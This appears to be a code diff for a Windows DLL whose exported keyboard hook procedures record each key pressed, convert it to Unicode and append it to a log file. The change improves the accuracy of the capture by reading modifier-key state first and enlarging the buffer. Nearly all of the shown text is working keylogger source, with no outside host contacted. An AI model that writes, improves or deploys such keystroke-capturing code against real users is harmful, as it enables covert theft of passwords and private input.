@@ -18,29 +18,31 @@ HHOOK global;
 extern "C" __declspec(dllexport) LRESULT WINAPI procedureKeyboard(int nCode, WPARAM wParam, LPARAM lParam) {
 	if (nCode == HC_ACTION) {
 
-		std::wofstream LogFile;
-		LogFile.open(filePath, std::ios_base::app);
+		if (!(HIWORD(lParam) & KF_UP))
+		{
+			//Extracting the data
+			KBDLLHOOKSTRUCT* data = (KBDLLHOOKSTRUCT*)lParam;
 
-		// check key up flag not set
-		if (!(HIWORD(lParam) & KF_UP)) {
-
-			// Get the keyboard state			
 			BYTE keyboardState[256];
-			GetKeyboardState(keyboardState);
-			// Note: using this can give the wrong caps when the hook and target application have different architectures:
-			// => in this case, this code is executed in the installer, not in the hooked application
-			// but GetKeyboardState is application specific
-
 			// Buffer to store the resulting Unicode character
-			WCHAR buffer[2];
+			WCHAR buffer[10];
 
-			// Convert the virtual key code to Unicode
-			int result = ToUnicode(wParam, MapVirtualKey(wParam, MAPVK_VK_TO_VSC), keyboardState, buffer, 2, 0);
-			LogFile << buffer;
+			// Using this first so the GetKeyboardState retrieves the keys correctly
+			GetKeyState(VK_SHIFT);
+			GetKeyState(VK_MENU);
+			GetKeyState(VK_CONTROL);
+
+			if (GetKeyboardState(keyboardState)) {
+				if (ToUnicode(wParam, MapVirtualKey(wParam, MAPVK_VK_TO_VSC), keyboardState, buffer, 10, 0) > 0)
+				{
+					std::wofstream LogFile;
+					LogFile.open(filePath, std::ios_base::app);
+					LogFile << buffer;
+					LogFile.close();
+				}
+			}
 		}
 
-		// Close the file
-		LogFile.close();
 	}
 	return CallNextHookEx(global, nCode, wParam, lParam);
 }
@@ -49,14 +51,11 @@ extern "C" __declspec(dllexport) LRESULT WINAPI procedureKeyboard(int nCode, WPA
 extern "C" __declspec(dllexport) LRESULT WINAPI procedureKeyboardLL(int nCode, WPARAM wParam, LPARAM lParam) {
 	if (nCode == HC_ACTION) {
 
-		std::wofstream LogFile;
-		LogFile.open(filePath, std::ios_base::app);
-
-		//Extracting the data
-		KBDLLHOOKSTRUCT* data = (KBDLLHOOKSTRUCT*)lParam;
-
 		if (wParam == WM_KEYDOWN)
 		{
+			//Extracting the data
+			KBDLLHOOKSTRUCT* data = (KBDLLHOOKSTRUCT*)lParam;
+
 			BYTE keyboardState[256];
 			// Buffer to store the resulting Unicode character
 			WCHAR buffer[10];
@@ -69,13 +68,14 @@ extern "C" __declspec(dllexport) LRESULT WINAPI procedureKeyboardLL(int nCode, W
 			if (GetKeyboardState(keyboardState)) {
 				if (ToUnicode(data->vkCode, data->scanCode, keyboardState, buffer, 10, 0) > 0)
 				{
+					std::wofstream LogFile;
+					LogFile.open(filePath, std::ios_base::app);
 					LogFile << buffer;
+					LogFile.close();
 				}
 			}
 		}
-
-		// Close the file
-		LogFile.close();
+		
 	}
 	return CallNextHookEx(global, nCode, wParam, lParam);
 }
